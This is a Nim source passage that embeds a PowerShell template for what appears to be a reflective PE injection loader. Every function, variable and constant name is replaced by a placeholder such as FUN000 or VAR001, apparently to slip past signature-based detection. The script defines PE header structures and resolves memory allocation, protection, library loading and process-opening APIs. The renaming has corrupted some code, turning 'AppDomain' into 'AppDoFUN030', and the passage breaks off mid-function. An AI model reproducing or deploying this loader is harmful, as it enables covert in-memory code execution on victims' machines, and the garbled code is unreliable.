let Powershelltemplate* = """

function FUN000 {

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $VAR001,

        [Parameter(Position = 1)]
        [String[]]
        $VAR002,

        [Parameter(Position = 2)]
        [ValidateSet( 'WideStr', 'Str', 'NoOutput', 'DefaultSettings' )]
        [String]
        $VAR003 = 'DefaultSettings',

        [Parameter(Position = 3)]
        [String]
        $VAR004,

        [Parameter(Position = 4)]
        [Int32]
        $VAR005,

        [Parameter(Position = 5)]
        [String]
        $VAR006,

        [Switch]
        $VAR007,

        [Switch]
        $VAR008
    )

    Set-StrictMode -Version 2


    $VAR009 = {
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $true)]
            [Byte[]]
            $VAR001,

            [Parameter(Position = 1, Mandatory = $true)]
            [String]
            $VAR003,

            [Parameter(Position = 2, Mandatory = $true)]
            [Int32]
            $VAR005,

            [Parameter(Position = 3, Mandatory = $true)]
            [String]
            $VAR006,

            [Parameter(Position = 4, Mandatory = $true)]
            [Bool]
            $VAR007,

            [Parameter(Position = 5, Mandatory = $true)]
            [String]
            $VAR004
        )
    
        
        
        
        Function FUN001 {
            $VAR010 = New-Object System.Object

            
            
            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
            $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
            $VAR015 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


            
            
            $VAR011 = $VAR014.DefineEnum('MachineType', 'Public', [UInt16])
            $VAR011.DefineLiteral('Native', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST089', [UInt16] 0x014c) | Out-Null
            $VAR011.DefineLiteral('CONST090', [UInt16] 0x0200) | Out-Null
            $VAR011.DefineLiteral('CONST091', [UInt16] 0x8664) | Out-Null
            $VAR016 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VAR016

            
            $VAR011 = $VAR014.DefineEnum('MagicType', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST100', [UInt16] 0x10b) | Out-Null
            $VAR011.DefineLiteral('CONST101', [UInt16] 0x20b) | Out-Null
            $VAR021 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name MagicType -Value $VAR021

            
            $VAR011 = $VAR014.DefineEnum('CONST047Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST102', [UInt16] 0) | Out-Null
            $VAR011.DefineLiteral('CONST103', [UInt16] 1) | Out-Null
            $VAR011.DefineLiteral('CONST104', [UInt16] 2) | Out-Null
            $VAR011.DefineLiteral('CONST099', [UInt16] 3) | Out-Null
            $VAR011.DefineLiteral('CONST098', [UInt16] 7) | Out-Null
            $VAR011.DefineLiteral('CONST097', [UInt16] 9) | Out-Null
            $VAR011.DefineLiteral('CONST096', [UInt16] 10) | Out-Null
            $VAR011.DefineLiteral('CONST095', [UInt16] 11) | Out-Null
            $VAR011.DefineLiteral('CONST094', [UInt16] 12) | Out-Null
            $VAR011.DefineLiteral('CONST093', [UInt16] 13) | Out-Null
            $VAR011.DefineLiteral('CONST092', [UInt16] 14) | Out-Null
            $VAR017 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST047Type -Value $VAR017

            
            $VAR011 = $VAR014.DefineEnum('CONST035Type', 'Public', [UInt16])
            $VAR011.DefineLiteral('CONST080', [UInt16] 0x0001) | Out-Null
            $VAR011.DefineLiteral('CONST079', [UInt16] 0x0002) | Out-Null
            $VAR011.DefineLiteral('CONST078', [UInt16] 0x0004) | Out-Null
            $VAR011.DefineLiteral('CONST077', [UInt16] 0x0008) | Out-Null
            $VAR011.DefineLiteral('CONST088', [UInt16] 0x0040) | Out-Null
            $VAR011.DefineLiteral('CONST087', [UInt16] 0x0080) | Out-Null
            $VAR011.DefineLiteral('CONST086', [UInt16] 0x0100) | Out-Null
            $VAR011.DefineLiteral('CONST085', [UInt16] 0x0200) | Out-Null
            $VAR011.DefineLiteral('CONST084', [UInt16] 0x0400) | Out-Null
            $VAR011.DefineLiteral('CONST083', [UInt16] 0x0800) | Out-Null
            $VAR011.DefineLiteral('CONST076', [UInt16] 0x1000) | Out-Null
            $VAR011.DefineLiteral('CONST082', [UInt16] 0x2000) | Out-Null
            $VAR011.DefineLiteral('CONST081', [UInt16] 0x8000) | Out-Null
            $VAR018 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST035Type -Value $VAR018

            
            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST075', $VAR019, [System.ValueType], 8)
        ($VAR011.DefineField('CONST074', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
            $VAR020 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST075 -Value $VAR020

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST073', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('Machine', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST072', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST070', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST069', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST068', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST067', [UInt16], 'Public') | Out-Null
            $VAR022 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST073 -Value $VAR022

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST066', $VAR019, [System.ValueType], 240)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST044', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(160) | Out-Null
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(192) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(200) | Out-Null
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(216) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(224) | Out-Null
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(232) | Out-Null
            $VAR023 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST066 -Value $VAR023

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST118', $VAR019, [System.ValueType], 224)
        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($VAR011.DefineField('CONST119', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($VAR011.DefineField('CONST058', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
        ($VAR011.DefineField('CONST046', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($VAR011.DefineField('CONST045', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($VAR011.DefineField('CONST044', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($VAR011.DefineField('CONST043', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(96) | Out-Null
        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(104) | Out-Null
        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(112) | Out-Null
        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(120) | Out-Null
        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(128) | Out-Null
        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(136) | Out-Null
        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(144) | Out-Null
        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(152) | Out-Null
        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(160) | Out-Null
        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(168) | Out-Null
        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(176) | Out-Null
        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(184) | Out-Null
        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(192) | Out-Null
        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(200) | Out-Null
        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(208) | Out-Null
        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(216) | Out-Null
            $VAR024 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST118 -Value $VAR024

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST03164', $VAR019, [System.ValueType], 264)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR023, 'Public') | Out-Null
            $VAR025 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03164 -Value $VAR025

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST03132', $VAR019, [System.ValueType], 248)
            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
            $VAR011.DefineField('CONST122', $VAR024, 'Public') | Out-Null
            $VAR026 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03132 -Value $VAR026

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST123', $VAR019, [System.ValueType], 64)
            $VAR011.DefineField('CONST124', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST125', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST126', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST127', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST128', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST129', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST130', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST131', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST132', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST133', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST134', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST135', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST136', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST137', [UInt16], 'Public') | Out-Null

            $VAR027 = $VAR011.DefineField('CONST138', [UInt16[]], 'Public, HasFieldMarshal')
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $VAR029 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 4))
            $VAR027.SetCustomAttribute($VAR030)

            $VAR011.DefineField('CONST139', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST140', [UInt16], 'Public') | Out-Null

            $VAR031 = $VAR011.DefineField('CONST1382', [UInt16[]], 'Public, HasFieldMarshal')
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 10))
            $VAR031.SetCustomAttribute($VAR030)

            $VAR011.DefineField('CONST141', [Int32], 'Public') | Out-Null
            $VAR032 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST123 -Value $VAR032

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST142', $VAR019, [System.ValueType], 40)

            $VAR033 = $VAR011.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 8))
            $VAR033.SetCustomAttribute($VAR030)

            $VAR011.DefineField('CONST143', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST144', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST145', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST146', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST147', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST148', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST149', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR034 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST142 -Value $VAR034

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST150', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST151', [UInt32], 'Public') | Out-Null
            $VAR035 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST150 -Value $VAR035

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST152', $VAR019, [System.ValueType], 20)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST153', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST154', [UInt32], 'Public') | Out-Null
            $VAR036 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST152 -Value $VAR036

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST155', $VAR019, [System.ValueType], 40)
            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST156', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('CONST157', [UInt16], 'Public') | Out-Null
            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('Base', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST158', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST159', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST160', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST161', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST162', [UInt32], 'Public') | Out-Null
            $VAR037 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST155 -Value $VAR037

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST163', $VAR019, [System.ValueType], 8)
            $VAR011.DefineField('CONST164', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST165', [UInt32], 'Public') | Out-Null
            $VAR038 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST163 -Value $VAR038

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST166', $VAR019, [System.ValueType], 12)
            $VAR011.DefineField('CONST163', $VAR038, 'Public') | Out-Null
            $VAR011.DefineField('Attributes', [UInt32], 'Public') | Out-Null
            $VAR039 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST166 -Value $VAR039

            
            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $VAR011 = $VAR014.DefineType('CONST167', $VAR019, [System.ValueType], 16)
            $VAR011.DefineField('CONST168', [UInt32], 'Public') | Out-Null
            $VAR011.DefineField('CONST169', $VAR039, 'Public') | Out-Null
            $VAR040 = $VAR011.CreateType()
            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST167 -Value $VAR040

            return $VAR010
        }

        Function FUN002 {
            $VAR0041 = New-Object System.Object

            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST001 -Value 0x00001000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST002 -Value 0x00002000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST003 -Value 0x01
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST004 -Value 0x02
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST005 -Value 0x04
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST006 -Value 0x08
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST007 -Value 0x10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST009 -Value 0x20
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST008 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST010 -Value 0x80
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST011 -Value 0x200
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST012 -Value 0
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST013 -Value 3
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST014 -Value 10
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST015 -Value 0x02000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST016 -Value 0x20000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST017 -Value 0x40000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST018 -Value 0x80000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST019 -Value 0x04000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST020 -Value 0x4000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST021 -Value 0x0002
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST022 -Value 0x2000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST023 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST024 -Value 0x100
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST025 -Value 0x8000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST026 -Value 0x0008
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST027 -Value 0x0020
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST028 -Value 0x2
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST029 -Value 0x3f0

            return $VAR0041
        }

        Function FUN003 {
            $VAR0042 = New-Object System.Object

            $VAR0043 = FUN012 kernel32.dll VirtualAlloc
            $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VAR0045 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0043, $VAR0044)
            $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045

            $VAR0046 = FUN012 kernel32.dll VirtualAllocEx
            $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
            $VAR0048 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0046, $VAR0047)
            $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048

            $VAR0049 = FUN012 msvcrt.dll memcpy
            $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
            $VAR0051 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0049, $VAR0050)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051

            $VAR0052 = FUN012 msvcrt.dll memset
            $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
            $VAR0054 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0052, $VAR0053)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054

            $VAR0055 = FUN012 kernel32.dll LoadLibraryA
            $VAR0056 = FUN011 @([String]) ([IntPtr])
            $VAR0057 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0055, $VAR0056)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057

            $VAR0058 = FUN012 kernel32.dll GetProcAddress
            $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
            $VAR0060 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0058, $VAR0059)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060

            $VAR0061 = FUN012 kernel32.dll GetProcAddress 
            $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
            $VAR0063 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0061, $VAR0062)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063

            $VAR0064 = FUN012 kernel32.dll VirtualFree
            $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0066 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0064, $VAR0065)
            $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066

            $VAR0067 = FUN012 kernel32.dll VirtualFreeEx
            $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
            $VAR0069 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0067, $VAR0068)
            $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069

            $VAR0070 = FUN012 kernel32.dll VirtualProtect
            $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
            $VAR0072 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0070, $VAR0071)
            $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072

            $VAR0073 = FUN012 kernel32.dll GetModuleHandleA
            $VAR0074 = FUN011 @([String]) ([IntPtr])
            $VAR0075 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0073, $VAR0074)
            $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075

            $VAR0076 = FUN012 kernel32.dll FreeLibrary
            $VAR0077 = FUN011 @([IntPtr]) ([Bool])
            $VAR0078 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0076, $VAR0077)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078

            $VAR0079 = FUN012 kernel32.dll OpenProcess
            $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
